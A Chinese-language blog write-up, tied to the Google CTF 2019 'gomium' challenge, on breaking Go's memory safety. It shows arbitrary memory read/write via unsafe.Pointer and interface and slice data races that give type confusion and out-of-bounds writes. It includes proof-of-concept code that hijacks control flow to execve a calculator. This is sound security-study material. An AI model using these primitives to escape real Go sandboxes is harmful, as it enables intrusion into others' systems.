# 0x00 引
在接触go以来，我一直认为go是一门相对来说比较“安全”的语言，至少我没有看见它像php一样，底层的CVE满天飞，同样底层都是用c实现的，而且相当于c来说，go不用考虑数组越界，不用考虑内存的分配释放，用户无法直接像c一样操作内存，所以我一度认为它是内存安全的。因为无法直接操作内存，似乎也无法通过某种方法劫持它的PC。

go是一门静态语言，不同类型直接是无法做到直接相互转换的，但是这里有一个例外--`interface`，它应该算是go里面最大的特色之一，理论上的duck typing，任何类型都是可以直接转换为`interface`。它也是一个静态类型，只是里面内容是运行时确定的。

基础静态类型`var A interface{}`和带方法的`type A interface {}`,内部实现又是不太一样的。

因为gooqgle ctf final  2019里面的一道gomium让我重新认识了go，原来是可以通过某种方式去打破go所维护的安全机制。所以有了此文，此文用于记录如何通过unsafe包来操作内存和竞争来劫持程序流。


# 0x01 unsafe package

```go
import "unsafe"

type Mem struct {
 addr *uintptr // actually == &m.data!
 data *uintptr
}

// Peek reads and returns the word at address addr.
func (m *Mem) Peek(addr uintptr) uintptr {
 *m.addr = addr
 return *m.data
}

// Poke sets the word at address addr to val.
func (m *Mem) Poke(addr, val uintptr) {
 *m.addr = addr
 *m.data = val
}

func NewMem() *Mem {
 m := new(Mem)
 m.addr = (*uintptr)(unsafe.Pointer(&m.data))
 return m
}
```
这个`Mem`结构很巧妙，其中有两个字段，`Mem.addr`记录是`Mem.data`的地址即`&Mem.data`. 它能接受一个整型变量，并把这个整型变量转换为一个整型指针，这个整型指针的值与整型变量的值一样，其中指针类型大小取决于操作系统平台，即`uintptr`大小。

其中对应读写的两个操作是通过写`Mem.addr`的值来读`*Mem.data`的值或者写`*Mem.data`来完成任意读写内存的操作。

`unsafe.Pointer`在这里的意义是能返回任何一个指向任意类型的指针。在这里相当于把 `**uintptr`转换为了`*uintptr`.这是任意读写的最本质的问题所在。

# 0x02 data race 
如果说unsafe是go给的一个特殊机制，赋予了用户读写内存的机会。如果说现在有一个sandbox，禁用了所有存在威胁package，以白名单的形式，这种情况下，是否有机会完成上述操作呢？data race就是在违背go设计机制的情况，用不同goroutine同时操作slice和interface的一种方式。

整型，浮点型，数组这种基础类型，其实比较好理解，那么比如切片，字符串，map，interface怎么去理解呢？
```c
struct slice{
	byte* array;
	uintgo len;
	uintgo cap;
}
```
可以看到切片实际底层还是指向的一个数组，但是只是引用了数组其中的一部分，`len`代表引用的长度，而`cap`代表这个数组长度，保证slice在引用的时候不会out of index。
```c
struct interface {
	Itab* tab
	void* data //实际储存的数据
}

struct Itab	{
	InterfaceType* inter// 接口定义的方法列表
	Type* type //实际存储的结构类型
	longlong[3] interdata
	void (*fun[])(void);//实际存储结构方法列表
}
```
这里结构指的是带方法的interface结构，并不是空接口类型。注意这一点
可以看到实际上slice和interface并不是一个c语言里面基础类型，而是一个结构，所以这里面有一点是必须注意到的，他们在初始化或者赋值的时候，从更底层汇编的角度来说，这个过程是一串指令而不是单独一个指令，即对他们的读写操作并不是一个原子操作。

那么在并发操作的时候就可能存在一些问题：
```go
type confuse interface {
	x(num uint64, cmd uint64, args uint64, env uint64)
}

type safe struct {
	i *uint64
}

type unsafe struct {
	f func(num uint64, cmd uint64, args uint64, env uint64)
}

func (t safe) x(num uint64, cmd uint64, args uint64, env uint64) {
	return
}

func (t unsafe) x(num uint64, cmd uint64, args uint64, env uint64) {
	if t.f != nil {
		//fmt.Println(t.f)
		t.f(num, cmd, args, env)
	}
}

func test(num uint64, cmd uint64, args uint64, env uint64) {
	fmt.Println(num)
	fmt.Println(cmd)
	fmt.Println(args)
	fmt.Println(env)
}

func main() {
	var i int=0
	///usr/bin/gnome-calculator
	cmd := [30]byte{47, 117, 115, 114, 47, 98, 105, 110, 47, 103, 110, 111, 109, 101, 45, 99, 97, 108, 99, 117, 108, 97, 116, 111, 114}
	//DISPLAY=:1
	display := [20]byte{68, 73, 83, 80, 76, 65, 89, 61, 58, 49}
	var args [2]uint64
	args[0] = address(&cmd)
	var envs [2]uint64
	envs[0] = address(&display)
	var con confuse
	adr_execve := address(test)
	adr_cmd := address(&cmd)
	type_safe := &safe{i: &adr_execve}
	type_unsafe := &unsafe{}
	con = type_safe
	go func() {
		for {
			i++
			con = type_unsafe
			func() {
				if i < 0 {
					fmt.Println("maplesss")
				}
				return
			}()
			con = type_safe
		}
	}()

	for {
		con.x(uint64(59), adr_cmd, address(&args), address(&envs))
	}
}
```
这一段代码最重要的核心在于
```go
go1 :
	con = type_unsafe
	con = type_safe
	
go2 :
	con.x(uint64(59), adr_cmd, address(&args), address(&envs))
```
上述两个goroutine，go1在不断交替给`con`赋值不同结构，赋值过程是一串指令，相当于con的更新过程，对应着修改底层所对应的interface结构里面的字段。go2却在不断调用con定义的方法，这两个过程是并发进行。这里面就会出现一个问题。

con所指向的interface里面最重要的是实际保存结构的值和实际结构所定义的方法。那么就可能出现一个过程，现在数据值变化了，保存对应方法的函数列表指针还没来的及更新，那可能导致context和对应的方法不一样。上面就可能出现用着safe的数据，调用确实unsafe的方法。如果unsafe里面字段是一个func类型，那么这样就相当于伪造出一个指向任意地址的函数指针，也就是我们常说一种类型混淆漏洞。

go里面是默认编译是忽略aslr的，当你编译一个go的普通二进制，在其符号表里面是可以看到默认是有syscall调用代码片段，并且我们能不用考虑aslr，直接用它。

在早期go里面，定义的全局变量，编译完成之后是放在text里面的，即是有执行权限的。这非常有趣。

上面我们通过竞争劫持pc，然后用基础类型来控制传参，go普通函数调用和c是一样的，所以用基础类型能完成一切，而方法调用是一种语法糖衣，函数的一个参数是方法所对应的结构本身。

安装上面的思路slice的赋值也不是原子操作，所以也可能存在问题：
```go
short := make([]int, 1)
long := make([]int, 2)
confuse := short

go1 :
	confuse = long
	confuse = short
go2 :
	confuse[1] = 0xfffffff 
```
在更新confuse的时候底层数组的指向变了，而`cap`的值还没有来得及更新。就可以oob写了

还有一段有意思的代码
```go
type Mem struct {
 addr *uintptr // actually == &m.data!
 data *uintptr
}

func NewMem() *Mem {
 fmt.Println("here we go!")
 m := new(Mem)
 var i, j, k interface{}
 i = (*uintptr)(nil)
 j = &m.data

 // Try over and over again until we win the race.
 done := false
 go func(){
  for !done {
   k = i
   k = j
  }
 }()
 for {
  // Is k a non-nil *uintptr?  If so, we got it.
  if p, ok := k.(*uintptr); ok && p != nil {
   m.addr = p
   done = true
   break
  }
 }
 return m
}
```
这段代码也很巧妙的不利用unsafe包的情况下把 `**uintptr` 转换成了`*uintptr`

# end
go原来这么有趣，这都是以前没有想过的思考面。所以记录下来。
![](http://research.swtch.com/gorace3.png)
下面一篇文章里面提出了一种修复的方式。造成data race的本质是更新interface使得老数据和新数据混杂了在一起。通过修改底层的interface结构，是其只有一个指针，执行上面红色方格的结构，当修改的时候，直接修改interface里面的指针，保证红色方框里面的结构不改变，但是代价是需要维护这样一个红色方框结构的列表。在如今的go里面上述方法同样试用，即并没有采用这种方法。

# link
[https://research.swtch.com/gorace](https://research.swtch.com/gorace)
[https://blog.stalkr.net/2015/04/golang-data-races-to-break-memory-safety.html](https://blog.stalkr.net/2015/04/golang-data-races-to-break-memory-safety.html)
[https://github.com/google/google-ctf/tree/master/2019/finals/pwn-gomium](https://github.com/google/google-ctf/tree/master/2019/finals/pwn-gomium)